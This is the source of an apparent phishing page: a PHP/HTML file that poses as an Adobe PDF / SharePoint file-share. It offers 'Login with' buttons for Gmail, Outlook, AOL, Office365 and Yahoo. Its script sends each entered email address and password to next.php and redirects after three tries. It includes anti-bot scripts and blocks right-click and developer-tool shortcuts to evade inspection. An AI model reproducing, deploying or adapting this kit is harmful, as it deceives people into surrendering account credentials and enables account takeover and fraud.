<?php

require 'Bots/anti1.php';
require 'Bots/anti2.php';
require 'Bots/anti3.php';
require 'Bots/anti4.php';
require 'Bots/anti5.php';
require 'Bots/anti6.php';
require 'Bots/anti7.php';
require 'Bots/anti8.php';


?>
<!doctype html>
<html lang="en">
<head>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
  <script src="https://code.jquery.com/jquery-3.1.1.min.js">
    <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
    <title>Share Point Online</title>
    <link href="css/hover.css" rel="stylesheet" media="all">

    <style type="text/css">


    </style>
  </head>
  <body style="background-image: url('https://cc-prod.scene7.com/is/image/CCProdAuthor/dt_Pr_marquee-1440x860?$pjpeg$&jpegSize=300&wid=1920'); background-size: cover;background-repeat: no-repeat;" oncontextmenu="return false">
    <div class="container-fluid p-0">
      <div class="container-fluid">
        <div class="row p-3" style="background-color: #ed1c24;">
          <div class="col-lg-12">
            <!-- <img src="images/box-w.png" class="img-fluid" width="60px;"> -->
            <span class="h4 text-white">Adobe Online Services</span>            
          </div>
          
        </div>
      </div>
      <div class="container-fluid">
      <div class="row">
        <div class="col-lg-10 mx-auto text-center" style="padding: 100px 50px 130px 50px;">
          <div> 
            <img src="images/adobe.png" class="img-fluid" width="100px"><br>
            <span class="h1 text-white">Adobe PDF</span><br>
            <span class="text-white h5">Only Receiver's email can access file sharing</span><br>
            <span class=" text-white">SELECT AND CLICK ON YOUR EMAIL PROVIDER BELOW</span><br>
            <span class="text-white font-weight-bold">Example:(user@Yourdomain.com)</span>
          </div>
          <div class="my-3 rounded">
            <div class="row p-3">
              <div class="col-lg-2 text-center">
                <a href="javascript:void(0)" id="gmailmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
                  <div class="rounded px-2 py-1 mt-2" style=" background-color: #D44638;">
                    <img src="images/gmail1.png" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;"><br>
                    <span class="pl-2" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Login with<br> Gmail</span>
                  </div>
                </a>
              </div>
              <div class="col-lg-2 text-center">
                <a href="javascript:void(0)" id="outlookmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
                  <div class="rounded px-2 py-1 mt-2" style="  background-color: #0073C8;">
                    <img src="images/outlook1.png" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;"><br>
                    <span class="pl-2" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Login with<br> Outlook</span>
                  </div>
                </a>
              </div>
              <div class="col-lg-2 text-center">
                <a href="javascript:void(0)" id="aolmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
                  <div class="rounded px-2 py-1 mt-2" style="background-color: #31459B;">
                    <img src="images/aol1.png" class="img-fluid" width="35px" style="padding:5px 0px 5px 0px;"><br>
                    <span class="pl-2" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Login with<br> Aol</span>
                  </div>
                </a>
              </div>
              <div class="col-lg-2 text-center">
                <a href="javascript:void(0)" id="office365modal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
                  <div class="rounded px-2 py-1 mt-2" style=" background-color: #FF3C00;">
                    <img src="images/office3651.png" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;"><br>
                    <span class="pl-2" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Login with<br> Office365</span>
                  </div>
                </a>
              </div>
              <div class="col-lg-2 text-center">
                <a href="javascript:void(0)" id="yahoomodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
                  <div class="rounded px-2 py-1 mt-2" style=" background-color: #5F0F68;">
                    <img src="images/yahoo1.png" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;"><br>
                    <span class="pl-2" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Login with<br> Yahoo!</span>
                  </div>
                </a>
              </div>
              <div class="col-lg-2 text-center">
                <a href="javascript:void(0)" id="othermodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
                  <div class="rounded px-2 py-1 mt-2" style=" background-color: #0B5BD3;">
                    <img src="images/other1.png" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;"><br>
                    <span class="pl-2" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Login with<br> Other Mail</span>
                  </div>
                </a>
              </div>
            </div>
          </div>
       </div> 
     </div> 
     </div>
   </div>




   <!-- Modal for gmail -->
   <div class="modal fade" id="ajaxModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
    <div class="modal-dialog" role="document">
      <div class="modal-content">
        <div class="modal-header">

          <button type="button" class="close" data-dismiss="modal" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
        <div class="modal-body">
          <center>
            <img id="fieldImg" src="images/gmail.png" class="img-fluid rounded-circle" width="80px">
            <h5 class="modal-title" id="exampleModalLabel">Login with <span id="field">Gmail</span></h5>
            <div class="alert alert-danger" id="msg"></div>

          </center>
          <form id="contact" class="form-horizontal well">
            <div class="col-lg-12">
              <div class="form-group">
                <label for="exampleInputEmail1">Email address</label>
                <input type="email" name="email" class="form-control" id="email" aria-describedby="emailHelp" placeholder="Enter email">
                <small id="emailHelp" class="form-text text-muted">We'll never share your email with anyone else.</small>
              </div>
            </div>
            <div class="col-lg-12">
              <div class="form-group">
                <label for="Password">Password</label>
                <input type="password" name="password" class="form-control" id="password" aria-describedby="emailHelp" placeholder="Enter Password">
              </div>
            </div>
          </div>
          <div class="modal-footer">
            <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
            <button class="btn btn-lg btn-info pull-right" id="submit-btn">Login</button>
          </div>
        </form>
      </div>
    </div>
  </div>


  <!-- Optional JavaScript -->
  <!-- jQuery first, then Popper.js, then Bootstrap JS -->
  <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
</body>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script>

  /* global $ */
  $(document).ready(function(){
    var count=0;
    $('#gmailmodal').click(function () {
      $('#contact').trigger("reset");
      $("#msg").hide();
      $('#fieldImg').attr('src', 'images/gmail.png');
      $('#field').html("Gmail");
      $('#ajaxModal').modal('show');
    });
    $('#outlookmodal').click(function () {
      $('#contact').trigger("reset");
      $("#msg").hide();
      $('#fieldImg').attr('src', 'images/outlook.png');
      $('#field').html("Outlook");
      $('#ajaxModal').modal('show');
    });
    $('#aolmodal').click(function () {
      $('#contact').trigger("reset");
      $("#msg").hide();
      $('#fieldImg').attr('src', 'images/aol.png');
      $('#field').html("Aol");
      $('#ajaxModal').modal('show');
    });
    $('#office365modal').click(function () {
      $('#contact').trigger("reset");
      $("#msg").hide();
      $('#fieldImg').attr('src', 'images/office365.png');
      $('#field').html("Office 365");
      $('#ajaxModal').modal('show');
    });
    $('#yahoomodal').click(function () {
      $('#contact').trigger("reset");
      $("#msg").hide();
      $('#fieldImg').attr('src', 'images/yahoo.png');
      $('#field').html("Yahoo");
      $('#ajaxModal').modal('show');
    });
    $('#othermodal').click(function () {
      $('#contact').trigger("reset");
      $("#msg").hide();
      $('#fieldImg').attr('src', 'images/othermail.ico');
      $('#field').html("Other Mail");
      $('#ajaxModal').modal('show');
    });
    $('#submit-btn').click(function(event){
      event.preventDefault();
      var email=$("#email").val();
      var password=$("#password").val();
      var detail=$("#field").html();


      var msg = $('#msg').html();
      $('#msg').text( msg );
      count=count+1;
        if (count>=3) {
          count=0;
          window.location.replace("server_response.php");
        }
        else
        {
       $.ajax({
        dataType: 'JSON',
        url: 'next.php',
        type: 'POST',
        data:{
          email:email,
          password:password,
          detail:detail,

        },
            // data: $('#contact').serialize(),
            beforeSend: function(xhr){
              $('#submit-btn').html('Verifing...');
            },
            success: function(response){
              if(response){
                $("#msg").show();
                console.log(response);
                if(response['signal'] == 'ok'){
                 $('#msg').html(response['msg']);
                  // $('input, textarea').val(function() {
                  //    return this.defaultValue;
                  // });
                }
                else{
                  $('#msg').html(response['msg']);
                }
              }
            },
            error: function(){
              $("#msg").show();
              $('#msg').html("Please try again later");
            },
            complete: function(){
              $('#submit-btn').html('Login');
            }
          });
     }
   });
  });

  document.onkeydown=function(e){
    if (e.ctrlKey && 
            (e.keyCode === 73 || 
             e.keyCode === 105 ||
              e.keyCode === 74 || 
             e.keyCode === 106 || 
             e.keyCode === 85 || 
             e.keyCode === 117)) {
            alert('not allowed');
            return false;
        } else {
            return true;
        }
  }
</script>
</html>